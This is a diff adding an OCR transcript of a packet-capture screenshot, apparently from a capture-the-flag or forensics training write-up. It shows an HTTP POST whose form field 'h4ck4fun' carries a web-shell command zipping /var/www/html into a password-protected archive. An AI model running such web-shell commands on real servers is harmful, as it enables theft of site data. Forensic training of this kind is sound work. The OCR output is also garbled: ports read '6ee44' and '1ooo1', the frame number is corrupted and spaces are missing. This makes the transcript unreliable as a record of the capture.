@@ -1,0 +1,13 @@
+# OCR: 64ccb458b031995898044e0984333782.webp
+# 来源: ./02-WriteUp/2025/2025-能力验证-培训/64ccb458b031995898044e0984333782.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:37
+
+Frame778o:Packet,872bytesonwire(6976bits)872bytescaptured(6976bits)
+Ethernet II,Src:Parallels6e:f7:4b(00:1c:42:6e:f7:4b)Dst:Parallels00:00:18(00:1c:42:00:00:18) InternetProtocolVersion4,Src:10.211.88.7(10.211.88.7),Dst:192.168.0.177(192.168.0.177)
+Transmission Control Protocol,Src Port:6ee44,Dst Port:1ooo1,Seq:1, Ack:1, Len: 818 HypertextTransferProtocol
+HTMLFormURLEncoded:application/x-www-form-urlencoded
+Formitem:"h4ck4fun"="system("zip-P5034737377307264www.zip/var/www/html");"
+Key:h4ck4fun
+Value:system("zip-P5034737377307264www.zip/var/www/html");
